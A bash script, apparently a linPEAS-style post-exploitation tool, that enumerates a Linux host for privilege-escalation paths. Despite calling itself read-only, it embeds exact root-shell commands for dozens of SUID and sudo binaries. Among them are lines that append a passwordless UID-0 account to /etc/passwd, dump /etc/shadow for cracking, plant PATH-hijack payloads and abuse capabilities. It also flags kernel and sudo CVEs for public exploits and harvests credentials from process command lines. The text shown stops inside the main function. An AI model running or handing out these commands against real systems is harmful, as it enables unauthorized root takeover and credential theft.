#!/usr/bin/env bash
# recce-enum.sh - thorough, READ-ONLY local enumeration for Linux/Unix.
#
# The on-target companion to recce: run this once you have a shell on a host to
# surface privilege-escalation vectors, lateral-movement / pivot leads, restricted-
# shell escapes and persistence footholds, plus sensitive exposure (a linPEAS-style
# sweep). It changes NOTHING - only reads system state with built-in tools - so
# it is safe to run and does not behave like malware. There is no exploit code,
# no download, no obfuscation. If an EDR flags a plain read-only script,
# coordinate an exclusion rather than trying to evade it.
#
# Usage:  ./recce-enum.sh [-t] [-q] [-o report.txt]
#           -t  self-test: parse-check the script + report which sections will
#               run on this host. Runs NO enumeration - safe first step.
#           -q  quiet: findings only (skip the raw dumps)
#           -o  also write everything to a file
#
# Findings marked [!] are worth a closer look. Every [!] that maps to a known
# escalation path is repeated at the end under "How to exploit", tailored to the
# exact file / binary / privilege found on THIS host, with the concrete steps.
#
# The exploitation guidance points at EXISTING public tools and techniques
# (GTFOBins, PwnKit/Dirty Pipe PoCs, impacket, john, …). It does not generate
# exploit code - you still run the referenced tool yourself, within your ROE.

export LC_ALL=C
QUIET=0; OUT=""; SELFTEST=0
while getopts "qo:th" opt; do
  case "$opt" in
    q) QUIET=1 ;;
    o) OUT="$OPTARG" ;;
    t) SELFTEST=1 ;;
    *) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
  esac
done

# --- output helpers ---
# Colour only for an interactive terminal AND when NOT also writing a report.
# With -o the entire run is teed to the file (see main() below), so we keep the
# output plain everywhere - that captures 100% of it, including raw command
# dumps, without embedding escape codes in the report.
if [ -t 1 ] && [ -z "$OUT" ]; then C_H='\033[1;36m'; C_F='\033[1;33m'; C_R='\033[0m'; else C_H=''; C_F=''; C_R=''; fi
_emit() { printf '%b\n' "$1"; }
sec()  { _emit ""; _emit "${C_H}==== $* ====${C_R}"; }
info() { [ "$QUIET" -eq 1 ] || _emit "$*"; }
find_() { _emit "${C_F}[!] $*${C_R}"; }         # a finding worth attention
have() { command -v "$1" >/dev/null 2>&1; }
cat_() { [ "$QUIET" -eq 1 ] && return 0; [ -r "$1" ] && { _emit "--- $1 ---"; sed 's/^/    /' "$1" 2>/dev/null; }; }

# --- exploitation-playbook accumulator ---------------------------------------
# flag TAG "detail"   records a vector (+ the specific artifact found) so the
# "How to exploit" section at the end can render a tailored runbook. Kept in a
# shell variable; loops that record run via  < <(...)  process substitution so
# they stay in the current shell (a piped 'while read' would lose the append).
PB=""
flag() { PB="${PB}${1}	${2}
"; }
pb_has()  { printf '%s' "$PB" | grep -q "^$1	"; }
pb_vals() { printf '%s' "$PB" | awk -F'\t' -v t="$1" '$1==t && $2!=""{print $2}' | sort -u; }

# --- GTFOBins-lite: the EXACT technique for a specific binary --------------------
# Instead of "look it up on gtfobins", print the precise command tailored to the
# binary we actually found. $1 = full path. Empty output = not a known abusable.
# SUID context: the technique keeps euid 0 (the -p shell flag where relevant).
gtfo_suid() {
  p="$1"; b=$(basename "$p")
  case "$b" in
    bash|dash|ash|sh|zsh|ksh) echo "$p -p";;
    find)            echo "$p . -exec /bin/sh -p \\; -quit";;
    nmap)            echo "echo 'os.execute(\"/bin/sh -p\")' >/tmp/x.nse; $p --script=/tmp/x.nse  (old nmap: $p --interactive then !sh)";;
    vim|rvim|vi)     echo "$p -c ':py3 import os;os.setuid(0);os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset;exec sh -p\")'";;
    less|more|pg)    echo "$p /etc/profile   then type:  !/bin/sh -p";;
    man)             echo "$p man   then type:  !/bin/sh -p";;
    awk|gawk|mawk|nawk) echo "$p 'BEGIN{system(\"/bin/sh -p\")}'";;
    env)             echo "$p /bin/sh -p";;
    perl)            echo "$p -e 'use POSIX qw(setuid);setuid(0);exec \"/bin/sh -p\";'";;
    python|python2|python3) echo "$p -c 'import os;os.setuid(0);os.system(\"/bin/sh -p\")'";;
    php)             echo "$p -r \"posix_setuid(0);system('/bin/sh -p');\"";;
    ruby)            echo "$p -e 'Process::Sys.setuid(0);exec \"/bin/sh -p\"'";;
    lua|lua5.1|lua5.3) echo "$p -e 'os.execute(\"/bin/sh -p\")'";;
    node)            echo "$p -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'";;
    tclsh)           echo "echo 'exec /bin/sh -p <@stdin >@stdout 2>@stderr' | $p";;
    gdb)             echo "$p -nx -ex 'python import os;os.setuid(0)' -ex '!sh -p' -ex quit";;
    cp)              echo "overwrite a root file: printf 'r::0:0::/root:/bin/bash\\n' | $p /dev/stdin /etc/passwd  ->  su r";;
    dd)              echo "printf 'r::0:0::/root:/bin/bash\\n' | $p of=/etc/passwd oflag=append conv=notrunc  ->  su r";;
    tee)             echo "printf 'r::0:0::/root:/bin/bash\\n' | $p -a /etc/passwd  ->  su r";;
    tar)             echo "$p -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh";;
    zip)             echo "$p /tmp/z.zip /etc/hosts -T -TT 'sh -p #'";;
    rsync)           echo "$p -e 'sh -p -c \"sh -p 0<&2 1>&2\"' 127.0.0.1:/dev/null";;
    sed)             echo "$p -n '1e exec /bin/sh -p' /etc/hosts";;
    ed)              echo "$p /etc/hosts   then type:  !/bin/sh -p";;
    ftp)             echo "$p   then type:  !/bin/sh -p";;
    make)            echo "COMMAND='/bin/sh -p'; $p -s --eval=\$'x:\\n\\t-'\"\$COMMAND\"";;
    nano|rnano)      echo "$p   then ^R^X and type:  reset; sh -p 1>&0 2>&0";;
    cat|head|tail)   echo "$p reads any file as root:  $p /etc/shadow   (then crack offline)";;
    xxd)             echo "$p /etc/shadow | $p -r   (read any root-owned file)";;
    base64|base32|basenc) echo "$p /etc/shadow | $p --decode   (read any root-owned file)";;
    openssl)         echo "$p enc -in /etc/shadow ...   (read/write any file as root - see GTFOBins openssl)";;
    chmod)           echo "$p u+s /bin/bash   ->  /bin/bash -p";;
    chown)           echo "$p \$(id -u):\$(id -g) /etc/shadow   ->  read it";;
    strace)          echo "$p -o /dev/null /bin/sh -p";;
    flock)           echo "$p -u / /bin/sh -p";;
    ionice|nice|nohup|stdbuf|timeout|setarch|taskset|watch|xargs|setsid) echo "$p /bin/sh -p   (wrapper -> spawns a euid-0 shell; xargs: echo | $p -a /bin/sh -p)";;
    socat)           echo "$p stdin exec:/bin/sh -p";;
    git)             echo "$p -p help   then:  !/bin/sh -p   (or PAGER=/bin/sh -p $p -p ...)";;
    *) echo "";;
  esac
}
# sudo context: already runs as root, so no -p; prefix with sudo <binary>.
gtfo_sudo() {
  p="$1"; b=$(basename "$p")
  case "$b" in
    find)            echo "sudo $p . -exec /bin/sh \\; -quit";;
    vim|rvim|vi)     echo "sudo $p -c ':!/bin/sh'";;
    less|more|pg)    echo "sudo $p /etc/profile   then:  !/bin/sh";;
    man)             echo "sudo $p man   then:  !/bin/sh";;
    awk|gawk)        echo "sudo $p 'BEGIN{system(\"/bin/sh\")}'";;
    env)             echo "sudo $p /bin/sh";;
    perl)            echo "sudo $p -e 'exec \"/bin/sh\";'";;
    python|python2|python3) echo "sudo $p -c 'import os;os.system(\"/bin/sh\")'";;
    php)             echo "sudo $p -r 'system(\"/bin/sh\");'";;
    ruby)            echo "sudo $p -e 'exec \"/bin/sh\"'";;
    node)            echo "sudo $p -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'";;
    nmap)            echo "sudo $p --interactive   then:  !sh   (or --script an os.execute)";;
    tar)             echo "sudo $p -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh";;
    apt|apt-get)     echo "sudo $p update -o APT::Update::Pre-Invoke::=/bin/sh";;
    git)             echo "sudo PAGER='sh -c \"exec sh 0<&1\"' $p -p help   (or -c core.pager)";;
    systemctl)       echo "sudo $p link /tmp/root.service && sudo $p start root  (unit ExecStart=/bin/sh - see GTFOBins)";;
    make)            echo "sudo $p -s --eval=\$'x:\\n\\t-/bin/sh'";;
    sed)             echo "sudo $p -n '1e exec /bin/sh' /etc/hosts";;
    ed)              echo "sudo $p   then:  !/bin/sh";;
    tee)             echo "printf 'r::0:0::/root:/bin/bash\\n' | sudo $p -a /etc/passwd  ->  su r";;
    dd)              echo "printf 'r::0:0::/root:/bin/bash\\n' | sudo $p of=/etc/passwd oflag=append conv=notrunc  ->  su r";;
    cp)              echo "sudo $p your_file /etc/... (overwrite a root-owned config/cron)";;
    zip)             echo "sudo $p /tmp/z.zip /etc/hosts -T -TT 'sh #'";;
    ftp)             echo "sudo $p   then:  !/bin/sh";;
    mount)           echo "sudo $p -o bind /bin/sh /bin/mount ... (see GTFOBins) - or mount a device to read files";;
    bash|sh|dash|ash|zsh|ksh) echo "sudo $p";;
    *) echo "";;
  esac
}
# analyze_suid <path>: read-only static analysis of a NON-standard SUID binary to
# find the ACTUAL escalation vector (PATH hijack / env / writable helper). Uses
# 'strings' only - it reads the file, never executes the target.
analyze_suid() {
  bin="$1"
  [ -w "$bin" ] && { info "      -> the SUID binary itself is WRITABLE: overwrite it with your payload"; flag ROOT_WRITABLE_BIN "$bin"; }
  have strings || { info "      (install binutils 'strings' for deeper static analysis of this binary)"; return; }
  st=$(strings -a "$bin" 2>/dev/null)
  # Does it shell out? (system/popen/exec* are the classic SUID sinks.)
  sink=$(printf '%s\n' "$st" | grep -oE '\b(system|popen|execl|execlp|execv|execvp|execve)\b' | sort -u | tr '\n' ',' | sed 's/,$//')
  # Bare command names it likely invokes -> PATH hijack. Whole-line single tokens
  # only, minus ELF/compiler/libc artifacts, so the list is plausible commands.
  hij=$(printf '%s\n' "$st" \
    | grep -oxE '[a-z][a-z0-9-]{1,15}' \
    | grep -vwE 'usage|error|null|true|false|root|main|system|popen|setuid|setgid|getuid|geteuid|printf|fprintf|sprintf|snprintf|puts|fputs|exit|abort|malloc|free|calloc|realloc|strcpy|strncpy|strcat|strlen|strcmp|strncmp|memcpy|memmove|memset|fopen|fclose|fread|fwrite|read|write|open|close|libc|gcc|glibc|clang|abi|note|comment|init|fini|gmon|environ|errno|stdin|stdout|stderr|getenv|setenv' \
    | sort -u | head -6 | tr '\n' ' ')
  if [ -n "$sink" ]; then
    info "      -> shells out via: $sink"
    if [ -n "$hij" ]; then
      find_ "SUID PATH-hijack candidate: $bin invokes bare command(s) [$hij] -> plant a malicious binary earlier in PATH"
      info  "         EXPLOIT: echo '/bin/bash -p' >/tmp/<cmd>; chmod +x /tmp/<cmd>; PATH=/tmp:\$PATH $bin"
      flag SUID_PATH_HIJACK "$bin :: $hij"
    fi
  fi
  printf '%s\n' "$st" | grep -qE 'LD_PRELOAD|LD_LIBRARY_PATH' && { find_ "SUID env-injection candidate: $bin reads LD_PRELOAD/LD_LIBRARY_PATH"; flag SUID_ENV "$bin"; }
  # Absolute paths it opens that are writable by us -> poison the input/config.
  printf '%s\n' "$st" | grep -oE '/(etc|opt|tmp|var|home|usr/local)/[A-Za-z0-9_./-]+' | sort -u | while read -r f; do
    [ -e "$f" ] && [ -w "$f" ] && { find_ "SUID reads a WRITABLE file: $bin opens $f -> poison it to influence the root process"; flag SUID_WRITABLE_HELPER "$bin :: $f"; }
  done
}

# --- self-test (pre-flight): verify the script + host, run NO enumeration ---
if [ "$SELFTEST" -eq 1 ]; then
  echo "recce-enum.sh self-test - verifies the script + host; runs NO enumeration"
  echo
  # 1) Syntax: parse-check this script.
  err=$(bash -n "$0" 2>&1)
  if [ -z "$err" ]; then echo "[ OK ] script parses cleanly (no syntax errors)"
  else echo "[FAIL] syntax errors:"; printf '%s\n' "$err" | sed 's/^/       /'; fi
  # 2) Host environment.
  os=$(. /etc/os-release 2>/dev/null; printf '%s' "${PRETTY_NAME:-unknown}")
  echo "[info] shell: ${BASH_VERSION:-sh}  user: $(id -un 2>/dev/null) (uid $(id -u 2>/dev/null))  kernel: $(uname -r 2>/dev/null)"
  echo "[info] os: $os"
  if [ "$(id -u 2>/dev/null)" = "0" ]; then echo "[info] running as root - full visibility"
  else echo "[info] non-root - some checks read less (still works)"; fi
  # 3) Command availability -> which section families will produce data here.
  chk_all() { n="$1"; shift; m=""; for c in "$@"; do have "$c" || m="$m $c"; done
              [ -z "$m" ] && echo "[ OK ] $n" || echo "[skip] $n - missing:$m (those checks self-skip)"; }
  chk_any() { n="$1"; shift; for c in "$@"; do have "$c" && { echo "[ OK ] $n (using $c)"; return; }; done
              echo "[skip] $n - none of: $* (those checks self-skip)"; }
  chk_all "System & kernel"     uname cat
  chk_all "Sudo"                sudo
  chk_all "SUID / SGID"         find
  chk_any "Capabilities"        getcap
  chk_any "Services (systemd)"  systemctl
  chk_all "Processes"           ps
  chk_any "Network sockets"     ss netstat
  chk_any "Network config"      ip ifconfig
  chk_any "Lateral movement"    ssh kubectl getent
  chk_any "Software inventory"  dpkg rpm
  chk_all "Core (always used)"  find grep sed awk
  echo "[info] also: restricted-shell, persistence-hook and lateral-movement sections always run (built-ins)"
  echo
  echo "Self-test complete. If the parse is OK, a real run is safe:  ./recce-enum.sh"
  exit 0
fi

# Everything the run prints is produced inside main() so a single tee at the end
# captures ALL of it in the report - including raw command dumps, not just the
# lines that pass through _emit. (This fixes the -o "missing output" bug.)
main() {
_emit "${C_H}recce-enum${C_R}  host=$(hostname 2>/dev/null)  user=$(id -un 2>/dev/null)  $(date 2>/dev/null)"
_emit "read-only local enumeration - nothing on this host is modified"
WHO=$(id -un 2>/dev/null)

# ============================================================ system / kernel
sec "System & kernel"
info "$(uname -a 2>/dev/null)"
cat_ /etc/os-release
info "uptime: $(uptime 2>/dev/null)"
KREL=$(uname -r 2>/dev/null)
info "kernel release: $KREL"
kmaj=${KREL%%.*}; kmin=$(printf '%s' "$KREL" | cut -d. -f2); kmin=${kmin%%[!0-9]*}
# Distro (some LPEs are distro-gated).
DISTRO=$(. /etc/os-release 2>/dev/null; printf '%s' "${ID:-}")
DVER=$(. /etc/os-release 2>/dev/null; printf '%s' "${VERSION_ID:-}")
# Cheap heuristic: very old kernels have many public local exploits.
if [ -n "$kmaj" ] && { [ "$kmaj" -lt 4 ] || { [ "$kmaj" -eq 4 ] && [ "${kmin:-0}" -lt 15 ]; }; }; then
  find_ "Old kernel ($KREL) - run a local-exploit suggester (linux-exploit-suggester.sh) offline"; flag KERNEL_OLD "$KREL"
fi
# DirtyCow (CVE-2016-5195): kernels before ~4.8.3 (huge install base historically).
if [ -n "$kmaj" ] && { [ "$kmaj" -lt 4 ] || { [ "$kmaj" -eq 4 ] && [ "${kmin:-0}" -le 8 ]; }; }; then
  find_ "Kernel $KREL is in the Dirty COW (CVE-2016-5195) range (< 4.8.3) - verify patch level"; flag DIRTYCOW "$KREL"
fi
# Dirty Pipe (CVE-2022-0847): kernel 5.8 up to 5.16.11 / 5.15.25 / 5.10.102.
if [ "$kmaj" = "5" ] && [ -n "$kmin" ] && [ "$kmin" -ge 8 ] && [ "$kmin" -le 16 ]; then
  find_ "Kernel $KREL is in the Dirty Pipe (CVE-2022-0847) range (5.8-5.16.11) - verify patch level"; flag DIRTYPIPE "$KREL"
fi
# nf_tables UAF (CVE-2024-1086): kernels ~5.14 through 6.6; needs unprivileged
# user namespaces (public LPE PoC). Range check kept deliberately broad.
nft=0
[ "$kmaj" = "5" ] && [ -n "$kmin" ] && [ "$kmin" -ge 14 ] && nft=1
[ "$kmaj" = "6" ] && [ -n "$kmin" ] && [ "$kmin" -le 6 ] && nft=1
if [ "$nft" = "1" ]; then find_ "Kernel $KREL is in the nf_tables CVE-2024-1086 range (5.14-6.6) - public LPE PoC (needs unprivileged user namespaces)"; flag NFTABLES "$KREL"; fi
# Unprivileged user namespaces = precondition for many recent LPEs.
if [ -r /proc/sys/kernel/unprivileged_userns_clone ]; then
  info "unprivileged_userns_clone: $(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null)"
fi
# ptrace_scope=0 lets you attach to other users' processes (dump creds / inject).
if [ -r /proc/sys/kernel/yama/ptrace_scope ]; then
  PTS=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
  info "ptrace_scope: $PTS"
  [ "$PTS" = "0" ] && { find_ "ptrace_scope=0 -> attach to other users' processes (dump memory/creds, inject a shell)"; flag PTRACE_SCOPE "0"; }
fi
# LSM enforcement (affects which container/SUID escapes work).
info "LSM: $( getenforce 2>/dev/null || { aa-status --enabled 2>/dev/null && echo 'AppArmor enabled'; } || echo 'none detected')"
# OverlayFS / GameOver(lay) (CVE-2021-3493, CVE-2023-2640/32629): Ubuntu-specific.
if [ "$DISTRO" = "ubuntu" ]; then
  find_ "Ubuntu $DVER (kernel $KREL) - check OverlayFS LPE CVE-2021-3493 and GameOver(lay) CVE-2023-2640/2023-32629 (Ubuntu-only, public one-liners)"; flag OVERLAYFS "$DVER/$KREL"
fi
# Looney Tunables (CVE-2023-4911): glibc ld.so, GLIBC_TUNABLES buffer overflow.
if have ldd; then
  GLIBC=$(ldd --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
  info "glibc: ${GLIBC:-?}"
  case "$GLIBC" in
    2.34|2.35|2.36|2.37) find_ "glibc $GLIBC - check Looney Tunables CVE-2023-4911 (GLIBC_TUNABLES ld.so overflow -> root; public PoC)"; flag LOONEY "$GLIBC";;
  esac
fi
[ -r /proc/version ] && info "$(cat /proc/version 2>/dev/null)"
info "arch: $(uname -m 2>/dev/null)"
# PwnKit (CVE-2021-4034): any pkexec/polkit before Jan-2022 is exploitable.
if have pkexec; then
  pv=$( { dpkg -l policykit-1 2>/dev/null || rpm -q polkit 2>/dev/null; } | grep -oE '0\.[0-9]+' | head -1)
  find_ "pkexec present (polkit ${pv:-?}) - verify PwnKit CVE-2021-4034 patch (fixed Jan-2022); trivially root if unpatched"; flag PWNKIT "polkit ${pv:-?}"
fi
# ld.so.preload: if writable, every dynamically-linked SUID call loads your lib.
[ -e /etc/ld.so.preload ] && { info "/etc/ld.so.preload exists: $(cat /etc/ld.so.preload 2>/dev/null | tr '\n' ' ')"; [ -w /etc/ld.so.preload ] && { find_ "/etc/ld.so.preload is WRITABLE -> global library injection into every SUID binary"; flag LDPRELOAD_FILE "/etc/ld.so.preload"; }; }

# ============================================================ current context
sec "Who am I / privileges"
info "$(id 2>/dev/null)"
info "groups: $(groups 2>/dev/null)"
GRPS=" $(id -Gn 2>/dev/null) "
case "$GRPS" in *" docker "*)  find_ "In the 'docker' group -> trivially root (mount / into a container)"; flag DOCKER_GRP "docker group";; esac
case "$GRPS" in *" lxd "*|*" lxc "*) find_ "In the 'lxd/lxc' group -> root via a privileged container"; flag LXD_GRP "lxd/lxc group";; esac
case "$GRPS" in *" disk "*)  find_ "In the 'disk' group -> read/write raw devices (debugfs /dev/sdaX -> read /etc/shadow)"; flag DISK_GRP "disk group";; esac
case "$GRPS" in *" adm "*)   find_ "In the 'adm' group -> read system logs (may contain creds)"; flag ADM_GRP "adm group";; esac
case "$GRPS" in *" video "*) info "In the 'video' group -> can read the framebuffer (/dev/fb0) - screen capture";; esac
[ "$(id -u 2>/dev/null)" = "0" ] && find_ "Already UID 0 (root)"
# Other UID-0 accounts in passwd (a hidden backdoor already present).
awk -F: '$3==0 && $1!="root"{print $1}' /etc/passwd 2>/dev/null | while read -r u; do find_ "Non-root account with UID 0: $u"; done

# ============================================================ sudo
sec "Sudo"
if have sudo; then
  SUV=$(sudo -V 2>/dev/null | head -1)
  info "$SUV"
  sv=$(printf '%s' "$SUV" | grep -oE '1\.[0-9]+\.[0-9]+[a-z]*[0-9]*' | head -1)
  # Baron Samedit (CVE-2021-3156) affects sudo < 1.9.5p2.
  case "$sv" in
    1.8.*|1.9.0*|1.9.1*|1.9.2*|1.9.3*|1.9.4*|1.9.5|1.9.5p1) find_ "sudo $sv may be vulnerable to CVE-2021-3156 (Baron Samedit) - local root"; flag SUDO_SAMEDIT "$sv";;
  esac
  # CVE-2023-22809 (sudoedit -e arbitrary file write): sudo 1.8.0 - 1.9.12p1.
  case "$sv" in
    1.8.*|1.9.0*|1.9.1*|1.9.2*|1.9.3*|1.9.4*|1.9.5*|1.9.6*|1.9.7*|1.9.8*|1.9.9*|1.9.10*|1.9.11*|1.9.12|1.9.12p1) find_ "sudo $sv - if you have any sudoedit/-e rule, check CVE-2023-22809 (edit arbitrary files as root)"; flag SUDO_22809 "$sv";;
  esac
  SUDOL=$(sudo -n -l 2>/dev/null)
  if [ -n "$SUDOL" ]; then
    info "sudo -l (no password prompt):"; printf '%s\n' "$SUDOL" | sed 's/^/    /'
    printf '%s' "$SUDOL" | grep -qiE '\(ALL(\s*:\s*ALL)?\)\s*(NOPASSWD:\s*)?ALL' && { find_ "sudo grants (ALL) ALL -> full root"; flag SUDO_ALL "(ALL) ALL"; }
    printf '%s' "$SUDOL" | grep -qi "env_keep.*LD_PRELOAD" && { find_ "LD_PRELOAD preserved in sudo env -> library injection to root"; flag SUDO_LDPRELOAD "env_keep LD_PRELOAD"; }
    printf '%s' "$SUDOL" | grep -qi "env_keep.*LD_LIBRARY_PATH" && { find_ "LD_LIBRARY_PATH preserved in sudo env -> library injection to root"; flag SUDO_LDLIB "env_keep LD_LIBRARY_PATH"; }
    printf '%s' "$SUDOL" | grep -qi "SETENV" && info "    SETENV present -> you can pass env vars into the sudo command (aids LD_* tricks)"
    # For each NOPASSWD binary, print the EXACT sudo escalation command for it.
    printf '%s\n' "$SUDOL" | grep -iE 'NOPASSWD' | grep -oE '/[A-Za-z0-9_./-]+' | sort -u | while read -r sb; do
      stech=$(gtfo_sudo "$sb")
      if [ -n "$stech" ]; then
        find_ "NOPASSWD sudo: $sb (GTFOBins) -> $stech"
      else
        find_ "NOPASSWD sudo: $sb -> GTFOBins '$(basename "$sb")' #sudo (root, no password); also check if $sb runs a writable script or a relative-path binary you can hijack"
      fi
    done
    # Record the whole no-pass allow-list for the playbook (basenames).
    NPB=$(printf '%s\n' "$SUDOL" | grep -iE 'NOPASSWD' | grep -oE '/[A-Za-z0-9_./-]+' | xargs -r -n1 basename 2>/dev/null | sort -u | tr '\n' ' ')
    [ -n "$NPB" ] && flag SUDO_NOPASSWD "$NPB"
  else
    info "sudo -l: needs a password or not permitted (try 'sudo -l' interactively)"
  fi
fi
cat_ /etc/sudoers
for f in /etc/sudoers.d/*; do cat_ "$f"; done

# ============================================================ SUID / SGID / caps
sec "SUID / SGID / capabilities"
# GTFOBins-known SUID abusables worth flagging immediately.
GTFO='aa-exec|ab|agetty|alpine|ar|arj|arp|ash|aspell|atobm|awk|base32|base64|basenc|bash|bridge|busybox|cabextract|capsh|cat|chmod|chown|chroot|cp|cpio|csh|csplit|cut|dash|date|dd|dialog|diff|dmsetup|docker|dosbox|ed|emacs|env|eqn|expand|expect|file|find|flock|fmt|fold|gawk|gcore|gdb|genie|gimp|grep|gtester|hd|head|hexdump|highlight|iconv|install|ionice|ip|jjs|join|jq|jrunscript|ksh|ld.so|less|logsave|look|lua|make|mawk|more|mosquitto|msgattrib|msgcat|msgconv|msgfilter|msgmerge|msguniq|multitime|mv|nano|nawk|nice|nl|nmap|node|nohup|od|openssl|openvpn|paste|perl|pg|php|pr|python|python2|python3|readelf|restic|rev|rlwrap|rsync|rtorrent|run-parts|rvim|scp|screen|script|sed|service|setarch|shuf|soelim|sort|sqlite3|ss|ssh|start-stop-daemon|stdbuf|strace|strings|sysadmctl|systemctl|tac|tail|tar|taskset|tclsh|tee|telnet|tftp|tic|time|timeout|troff|ul|unexpand|uniq|unshare|unzip|update-alternatives|vi|vim|watch|wc|wget|xargs|xxd|xz|zip|zsh|zsoelim'
# Baseline of expected system SUID roots - anything else is worth a manual look.
SUID_BASE='ping|ping6|su|sudo|mount|umount|passwd|chsh|chfn|gpasswd|newgrp|pkexec|fusermount|fusermount3|ntfs-3g|dbus-daemon-launch-helper|polkit-agent-helper-1|snap-confine|Xorg|vmware-user-suid-wrapper|sg|expiry|unix_chkpwd|at|crontab|ssh-keysign|write|wall'
info "SUID binaries:"
while read -r b; do
  [ -z "$b" ] && continue
  base=$(basename "$b")
  if printf '%s' "$base" | grep -qxE "$GTFO"; then
    # Don't just flag it - print the EXACT technique for THIS binary.
    tech=$(gtfo_suid "$b")
    if [ -n "$tech" ]; then
      find_ "SUID $b (GTFOBins) -> $tech"; flag SUID_GTFO "$b -> $tech"
    else
      find_ "SUID $b (GTFOBins escalation candidate) - see gtfobins.github.io/#$base"; flag SUID_GTFO "$b"
    fi
  elif printf '%s' "$base" | grep -qxE "$SUID_BASE"; then
    info "    $b"
  else
    # Unknown/custom SUID root binary: go deeper with read-only static analysis to
    # find the ACTUAL vector (PATH hijack / env / writable helper), not just flag it.
    find_ "Non-standard SUID root binary: $b - analyzing:"; flag SUID_CUSTOM "$b"
    analyze_suid "$b"
  fi
done < <(find / -perm -4000 -type f 2>/dev/null)
info "SGID binaries:"
find / -perm -2000 -type f 2>/dev/null | sed 's/^/    /'
if have getcap; then
  info "File capabilities:"
  while read -r line; do
    [ -z "$line" ] && continue
    capbin=$(printf '%s' "$line" | awk '{print $1}')
    case "$line" in
      *cap_setuid*)
        cx=""
        case "$(basename "$capbin")" in
          python|python2|python3) cx="$capbin -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'";;
          perl) cx="$capbin -e 'use POSIX;setuid(0);exec \"/bin/sh\";'";;
          ruby) cx="$capbin -e 'Process::Sys.setuid(0);exec \"/bin/sh\"'";;
          node) cx="$capbin -e 'process.setuid(0);require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'";;
          php)  cx="$capbin -r 'posix_setuid(0);system(\"/bin/sh\");'";;
        esac
        if [ -n "$cx" ]; then find_ "Capability cap_setuid on $capbin -> EXACT: $cx"; else find_ "Capability cap_setuid on $capbin -> call setuid(0) then exec a shell"; fi
        flag CAP_SETUID "$capbin";;
      *cap_setgid*) find_ "Capability cap_setgid on $capbin -> privesc candidate"; flag CAP_GENERIC "$capbin";;
      *cap_dac_read_search*) find_ "Capability cap_dac_read_search on $capbin -> read ANY file, e.g.:  $capbin /etc/shadow  (then crack)"; flag CAP_DAC "$capbin";;
      *cap_dac_override*) find_ "Capability cap_dac_override on $capbin -> overwrite ANY file (add a UID-0 line to /etc/passwd)"; flag CAP_DAC "$capbin";;
      *cap_sys_admin*|*cap_sys_ptrace*|*cap_sys_module*) find_ "Capability $line -> powerful privesc candidate (namespace/ptrace/module load)"; flag CAP_GENERIC "$capbin";;
      *) info "    $line";;
    esac
  done < <(getcap -r / 2>/dev/null)
fi

# ============================================================ cron / timers
sec "Cron & systemd timers"
for f in /etc/crontab /etc/cron.d/* ; do cat_ "$f"; done
info "cron dirs:"; ls -la /etc/cron.* 2>/dev/null | sed 's/^/    /'
# Writable script referenced by a root cron/timer is a classic root path.
for d in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
  [ -d "$d" ] && while read -r w; do [ -n "$w" ] && { find_ "World/'$WHO'-writable cron script: $w"; flag CRON_WRITABLE "$w"; }; done < <(find "$d" -maxdepth 1 -type f -writable 2>/dev/null)
done
# Wildcard injection: a root cron running tar/rsync/chown/chmod/zip with a bare
# '*' in a writable dir lets you smuggle args via crafted filenames.
while read -r line; do
  case "$line" in
    *tar\ *\**|*rsync\ *\**|*chown\ *\**|*chmod\ *\**|*zip\ *\**|*7z\ *\**) find_ "Cron wildcard-injection candidate: $line"; flag CRON_WILDCARD "$line";;
  esac
done < <(cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -v '^#')
crontab -l 2>/dev/null | grep -v '^#' | sed 's/^/    (user cron) /'
have systemctl && systemctl list-timers --all 2>/dev/null | sed 's/^/    /' | head -40

# ============================================================ services / processes
sec "Services & processes running as root"
info "Processes (root-owned, top by start):"
ps -eo user,pid,comm,args 2>/dev/null | awk '$1=="root"' | sed 's/^/    /' | head -60
# Passwords passed on a command line (visible to any user via ps).
while read -r line; do [ -n "$line" ] && { find_ "Possible credential in a process command line: $line"; flag PS_CREDS "$line"; }; done < <(ps -eo args 2>/dev/null | grep -iE -- '-p *[^ ]|password=|--pass|PGPASSWORD|MYSQL_PWD|token=' | grep -viE 'grep|recce-enum' | head -10)
# Root-run network daemons that are classic local-root paths.
if ps -eo user,comm 2>/dev/null | awk '$1=="root"{print $2}' | grep -qx 'mysqld\|mariadbd'; then
  find_ "MySQL/MariaDB running as root -> if you have DB creds, a User-Defined Function (UDF) gives command exec as root"; flag MYSQL_ROOT "mysqld/root"
fi
if ps -eo comm 2>/dev/null | grep -qx 'redis-server'; then
  redisbind=$(ss -tlnp 2>/dev/null | grep ':6379' )
  [ -n "$redisbind" ] && { find_ "redis-server listening ($redisbind) - if unauthenticated, write an SSH key / cron via CONFIG SET"; flag REDIS "$redisbind"; }
fi
# Writable systemd unit files / writable binaries a root service runs.
if have systemctl; then
  while read -r u; do
    [ -z "$u" ] && continue
    p=$(systemctl show -p FragmentPath --value "$u" 2>/dev/null)
    [ -n "$p" ] && [ -w "$p" ] && { find_ "Writable service unit: $p ($u)"; flag SVC_UNIT "$p"; }
  done < <(systemctl list-unit-files --type=service 2>/dev/null | awk 'NR>1{print $1}' | grep '\.service$')
fi
# Writable binaries invoked by root processes.
while read -r bin; do
  [ -n "$bin" ] && [ -f "$bin" ] && [ -w "$bin" ] && { find_ "Root process runs a WRITABLE binary: $bin"; flag ROOT_WRITABLE_BIN "$bin"; }
done < <(ps -eo user,args 2>/dev/null | awk '$1=="root"{print $2}' | sort -u)

# ============================================================ writable / PATH
sec "Writable files & PATH hijack"
info "PATH: $PATH"
IFS=:; for d in $PATH; do [ -d "$d" ] && [ -w "$d" ] && { find_ "Writable dir in PATH: $d (binary planting)"; flag PATH_WRITABLE "$d"; }; done; unset IFS
